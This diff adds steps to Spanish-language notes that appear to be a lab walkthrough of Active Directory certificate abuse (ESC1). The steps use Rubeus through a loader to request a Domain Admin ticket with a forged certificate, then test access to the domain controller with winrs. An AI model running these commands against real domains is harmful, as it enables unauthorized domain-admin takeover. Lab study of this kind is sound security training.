@@ -1471,3 +1471,12 @@ Lo convertiremos en PFX, usara el binario de *openssl* con la contraseña a usar
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
 ```
 
+Ahora tendremos que obtener el TGT para Domain Admin
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
+```
+
+Ahora ya podemos probar si podemos acceder
+```shell
+winrs -r:dcorp-dc cmd /c set username
+```
